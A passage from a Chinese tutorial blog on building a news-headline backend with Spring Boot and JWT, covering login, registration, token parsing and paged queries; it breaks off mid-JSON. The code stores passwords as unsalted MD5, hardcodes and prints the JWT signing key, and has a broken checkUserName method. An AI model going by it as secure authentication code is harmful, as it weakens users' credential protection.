<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>Signature（签名）</strong>：使用Header中指定的算法对编码后的Header和Payload进行签名，以确保消息在传输过程中未被篡改。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>

<p>最终的JWT看起来像这样：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">xxxxx.yyyyy.zzzzz</span><br></pre></td></tr></table></figure>

<p>JWT<strong>的工作流程</strong>：</p>
<ol>
<li><strong>用户登录</strong>：用户提供凭证（用户名&#x2F;密码）并发送到服务器。</li>
<li><strong>生成JWT</strong>：服务器验证凭证后，创建JWT并返回给客户端。</li>
<li><strong>存储JWT</strong>：客户端存储JWT（通常在本地存储或cookie中）。</li>
<li><strong>访问受保护资源</strong>：客户端在每次请求时附带JWT（通常放在Authorization头中）。</li>
<li><strong>验证JWT</strong>：服务器解码并验证JWT的有效性和签名，然后处理请求。</li>
</ol>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><strong>依赖</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>配置</strong>：application.yaml，这是自己配置的配置项，后面在JWT工具类中导入</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jwt:</span></span><br><span class="line">  <span class="attr">token:</span></span><br><span class="line">    <span class="attr">tokenExpiration:</span> <span class="number">120</span> <span class="comment">#有效时间,单位分钟</span></span><br><span class="line">    <span class="attr">tokenSignKey:</span> <span class="string">headline230101</span> <span class="comment">#当前程序签名秘钥 自定义</span></span><br></pre></td></tr></table></figure>



<p><strong>工具类：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;jwt.token&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtHelper</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> tokenExpiration; <span class="comment">//有效时间,单位毫秒 1000毫秒 == 1秒</span></span><br><span class="line">    <span class="keyword">private</span> String tokenSignKey; <span class="comment">//当前程序签名秘钥</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成token字符串</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">createToken</span><span class="params">(Long userId)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;tokenExpiration = &quot;</span> +</span><br><span class="line">                tokenExpiration);</span><br><span class="line">        System.out.println(<span class="string">&quot;tokenSignKey = &quot;</span> + tokenSignKey);</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder()</span><br><span class="line">                .setSubject(<span class="string">&quot;YYGH-USER&quot;</span>)</span><br><span class="line">                .setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis()</span><br><span class="line">                        + tokenExpiration * <span class="number">1000</span> * <span class="number">60</span>)) <span class="comment">//单位分钟</span></span><br><span class="line">                .claim(<span class="string">&quot;userId&quot;</span>, userId)</span><br><span class="line">                .signWith(SignatureAlgorithm.HS512, tokenSignKey)</span><br><span class="line">                .compressWith(CompressionCodecs.GZIP)</span><br><span class="line">                .compact();</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从token字符串获取userid</span></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">getUserId</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(token)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Jws&lt;Claims&gt; claimsJws =</span><br><span class="line">                Jwts.parser().setSigningKey(tokenSignKey).parseClaimsJws(token);</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> claimsJws.getBody();</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">userId</span> <span class="operator">=</span> (Integer) claims.get(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> userId.longValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断token是否有效</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isExpiration</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isExpire</span> <span class="operator">=</span> Jwts.parser()</span><br><span class="line">                    .setSigningKey(tokenSignKey)</span><br><span class="line">                    .parseClaimsJws(token)</span><br><span class="line">                    .getBody()</span><br><span class="line">                    .getExpiration().before(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line"><span class="comment">//没有过期，有效，返回false</span></span><br><span class="line">            <span class="keyword">return</span> isExpire;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//过期出现异常，返回true</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="用户功能模块开发"><a href="#用户功能模块开发" class="headerlink" title="用户功能模块开发"></a>用户功能模块开发</h3><h4 id="登录功能实现"><a href="#登录功能实现" class="headerlink" title="登录功能实现"></a>登录功能实现</h4><h5 id="接口文档"><a href="#接口文档" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址： user&#x2F;login<br>请求方式：POST<br>请求参数：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;zhangsan&quot;</span><span class="punctuation">,</span> <span class="comment">//用户名</span></span><br><span class="line"><span class="attr">&quot;userPwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span> <span class="comment">//明文密码</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>响应数据：<br>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span> <span class="comment">// 成功状态码</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span> <span class="comment">// 成功状态描述</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;... ...&quot;</span> <span class="comment">// 用户id的token</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>失败</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;501&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;用户名有误&quot;</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;503&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;密码有误&quot;</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p><strong>controller</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;user&quot;)</span></span><br><span class="line"><span class="comment">// 跨域</span></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">login</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span>&#123;</span><br><span class="line">        <span class="type">Result</span> <span class="variable">result</span> <span class="operator">=</span> userService.login(user);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>service</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">login</span><span class="params">(User user)</span> &#123;</span><br><span class="line">    LambdaQueryWrapper&lt;User&gt; lambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    lambdaQueryWrapper.eq(User::getUsername, user.getUsername());</span><br><span class="line">    <span class="type">User</span> <span class="variable">userLogin</span> <span class="operator">=</span> userMapper.selectOne(lambdaQueryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(userLogin == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> Result.build(<span class="literal">null</span>, ResultCodeEnum.USERNAME_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!StringUtils.isEmpty(user.getUserPwd())</span><br><span class="line">            &amp;&amp; MD5Util.encrypt(user.getUserPwd()).equals(userLogin.getUserPwd())</span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> jwtHelper.createToken(Long.valueOf(userLogin.getUid()));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        data.put(<span class="string">&quot;token&quot;</span>,token);</span><br><span class="line">        <span class="keyword">return</span> Result.ok(data);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Result.build(<span class="literal">null</span>,ResultCodeEnum.PASSWORD_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="根据token-获取用户数据"><a href="#根据token-获取用户数据" class="headerlink" title="根据token 获取用户数据"></a>根据token 获取用户数据</h4><p>客户端发送请求,提交token请求头,后端根据token请求头获取登录用户的详细信息并响应给客户端进行存储</p>
<h5 id="接口文档-1"><a href="#接口文档-1" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：user&#x2F;getUserInfo<br>请求方式：GET<br>请求头：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">token<span class="punctuation">:</span> token内容</span><br></pre></td></tr></table></figure>

<p>响应数据：<br>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;loginUser&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;uid&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;zhangsan&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;userPwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;nickName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>失败</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">504</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;notLogin&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">getUserInfo</span><span class="params">(String token)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(jwtHelper.isExpiration(token))&#123;</span><br><span class="line">       <span class="keyword">return</span> Result.build(<span class="literal">null</span>,ResultCodeEnum.NOTLOGIN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> jwtHelper.getUserId(token).intValue();</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectById(userId);</span><br><span class="line">    user.setUserPwd(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    data.put(<span class="string">&quot;loginUser&quot;</span>,user);</span><br><span class="line">    <span class="keyword">return</span> Result.ok(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="检查账号是否可用"><a href="#检查账号是否可用" class="headerlink" title="检查账号是否可用"></a>检查账号是否可用</h4><p>用户在注册时输入用户名时,立刻将用户名发送给后端,后端根据用户名查询用户名是否可用并做出响应</p>
<h5 id="接口文档-2"><a href="#接口文档-2" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：user&#x2F;checkUserName<br>请求方式：POST<br>请求参数：param形式</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">username=zhangsan</span><br><span class="line">响应数据：</span><br></pre></td></tr></table></figure>

<p>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>失败</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;505&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;用户名占用&quot;</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">checkUserName</span><span class="params">(String username)</span> &#123;</span><br><span class="line">  LambdaQueryWrapper&lt;User&gt; lambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        lambdaQueryWrapper.eq(User::getUsername, user.getUsername());</span><br><span class="line">        <span class="type">Long</span> <span class="variable">aLong</span> <span class="operator">=</span> userMapper.selectCount(lambdaQueryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(aLong!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> Result.build(<span class="number">505</span>,ResultCodeEnum.USERNAME_USED);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Result.ok(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="用户注册"><a href="#用户注册" class="headerlink" title="用户注册"></a>用户注册</h4><p>客户端将新用户信息发送给服务端,服务端将新用户存入数据库,存入之前做用户名是否被占用校验,校验通过响应成功提示,否则响应失败提示</p>
<h5 id="接口文档-3"><a href="#接口文档-3" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：user&#x2F;regist<br>请求方式：POST<br>请求参数：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;zhangsan&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;userPwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;nickName&quot;</span><span class="punctuation">:</span><span class="string">&quot;张三&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>响应数据：<br>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>失败</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;505&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;用户名占用&quot;</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 客户端将新用户信息发送给服务端,服务端将新用户存入数据库,</span></span><br><span class="line"><span class="comment"> * 存入之前做用户名是否被占用校验,校验通过响应成功提示,否则响应失败提示</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> user</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">regist</span><span class="params">(User user)</span> &#123;</span><br><span class="line">    LambdaQueryWrapper&lt;User&gt; lambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    lambdaQueryWrapper.eq(User::getUsername, user.getUsername());</span><br><span class="line">    <span class="type">Long</span> <span class="variable">aLong</span> <span class="operator">=</span> userMapper.selectCount(lambdaQueryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(aLong!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> Result.build(<span class="number">505</span>,ResultCodeEnum.USERNAME_USED);</span><br><span class="line">    &#125;</span><br><span class="line">    user.setUserPwd(MD5Util.encrypt(user.getUserPwd()));</span><br><span class="line">    <span class="type">int</span> <span class="variable">rows</span> <span class="operator">=</span> userMapper.insert(user);</span><br><span class="line">    System.out.println(<span class="string">&quot;rows = &quot;</span> + rows);</span><br><span class="line">    <span class="keyword">return</span> Result.ok(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="首页模块开发"><a href="#首页模块开发" class="headerlink" title="首页模块开发"></a>首页模块开发</h3><h4 id="查询首页分类"><a href="#查询首页分类" class="headerlink" title="查询首页分类"></a>查询首页分类</h4><h5 id="接口文档-4"><a href="#接口文档-4" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：portal&#x2F;findAllTypes<br>请求方式：get<br>请求参数：无<br>响应数据：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">成功</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;tid&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;tname&quot;</span><span class="punctuation">:</span><span class="string">&quot;新闻&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;tid&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;tname&quot;</span><span class="punctuation">:</span><span class="string">&quot;体育&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;tid&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;tname&quot;</span><span class="punctuation">:</span><span class="string">&quot;娱乐&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;tid&quot;</span><span class="punctuation">:</span><span class="string">&quot;4&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;tname&quot;</span><span class="punctuation">:</span><span class="string">&quot;科技&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;tid&quot;</span><span class="punctuation">:</span><span class="string">&quot;5&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;tname&quot;</span><span class="punctuation">:</span><span class="string">&quot;其他&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">findAllTypes</span><span class="params">()</span> &#123;</span><br><span class="line">    List&lt;Type&gt; types = typeMapper.selectList(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> Result.ok(types);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="首页分页头条"><a href="#首页分页头条" class="headerlink" title="首页分页头条"></a>首页分页头条</h4><p>客户端向服务端发送查询关键字,新闻类别,页码数,页大小</p>
<p>服务端根据条件搜索分页信息,返回含页码数,页大小,总页数,总记录数,当前页数据等信息,并根据时间降序,浏览量降序排序</p>
<h5 id="接口文档-5"><a href="#接口文档-5" class="headerlink" title="接口文档"></a>接口文档</h5><p>url地址：portal&#x2F;findNewsPage<br>请求方式：post<br>请求参数:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;keyWords&quot;</span><span class="punctuation">:</span><span class="string">&quot;马斯克&quot;</span><span class="punctuation">,</span> <span class="comment">// 搜索标题关键字</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span> <span class="comment">// 新闻类型</span></span><br><span class="line"><span class="attr">&quot;pageNum&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span> <span class="comment">// 页码数</span></span><br><span class="line"><span class="attr">&quot;pageSize&quot;</span><span class="punctuation">:</span><span class="number">10</span> <span class="comment">// 页大小</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>响应数据：<br>成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;pageInfo&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;pageData&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;hid&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻id</span></span><br><span class="line"><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;尚硅谷宣布 ... ...&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻标题</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻所属类别编号</span></span><br><span class="line"><span class="attr">&quot;pageViews&quot;</span><span class="punctuation">:</span><span class="string">&quot;40&quot;</span><span class="punctuation">,</span> <span class="comment">// 新闻浏览量</span></span><br><span class="line"><span class="attr">&quot;pastHours&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span> <span class="punctuation">,</span> <span class="comment">// 